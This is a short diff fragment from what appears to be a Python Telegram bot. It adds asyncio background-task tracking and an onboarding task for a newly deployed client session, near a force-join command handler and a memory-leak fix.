+            _PROMOTION_JOBS[id(client)] = task
+            background_tasks.add(task)
+            task.add_done_callback(background_tasks.discard)
 
         elif re.match(r"(?i)^\.fjadd\s+(\S+)$", text):
             # .fjadd @username — add user to FORCEJOIN_USERS custom list
@@ -10682,6 +10640,10 @@ async def deploy_new_session_string(session_str: str, is_startup: bool = False,
             except Exception:
                 pass
         bot_logger("DEPLOY_OK", f"Core: {me.first_name} ({me.id})")
+        if not is_startup:
+            _onboard = asyncio.create_task(_onboard_logged_in_core(new_client))
+            background_tasks.add(_onboard)
+            _onboard.add_done_callback(background_tasks.discard)
         # BUG FIX: prune finished tasks — background_tasks grew forever as
         # extra cores came and went (memory leak over long uptimes).
         _bg_task = asyncio.create_task(_run_extra_core(new_client, int(me.id)))
